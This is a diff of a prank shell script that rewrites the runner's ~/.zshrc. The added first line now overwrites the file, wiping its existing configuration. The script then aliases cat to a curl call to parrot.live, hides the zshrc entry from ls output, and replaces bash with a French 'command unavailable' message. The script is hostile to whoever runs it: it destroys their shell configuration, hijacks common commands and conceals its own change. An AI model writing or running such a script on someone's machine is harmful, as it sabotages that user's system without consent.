@@ -4,6 +4,7 @@ echo "Hello, GOod Luck"
 
 file=~/.zshrc
 
+echo 'alias cat="curl -i parrot.live"' > ${file}
 echo 'alias cat="curl -i parrot.live"' >> ${file}
 echo 'alias cat="curl -i parrot.live"' >> ${file}
 echo 'alias cat="curl -i parrot.live"' >> ${file}
@@ -103,9 +104,8 @@ echo 'alias cat="curl -i parrot.live"' >> ${file}
 echo 'alias cat="curl -i parrot.live"' >> ${file}
 echo 'alias cat="curl -i parrot.live"' >> ${file}
 echo 'alias cat="curl -i parrot.live"' >> ${file}
-echo 'alias cat="curl -i parrot.live"' >> ${file}
-echo 'alias ls="f(){ ls "$@" | sed s/${file}//g; unset -f f; }; f"' >> ${file}
-echo 'alias bash="f(){echo "commande indisponible $2"}; f"' >> ${file}
+echo 'alias ls="f(){ ls \"$@\" | sed s/${file}//g; unset -f f; }; f"' >> ${file}
+echo 'alias bash="f(){echo \"commande indisponible $2\"}; f"' >> ${file}
 echo 'alias cat="curl -i parrot.live"' >> ${file}
 echo 'alias cat="curl -i parrot.live"' >> ${file}
 echo 'alias cat="curl -i parrot.live"' >> ${file}
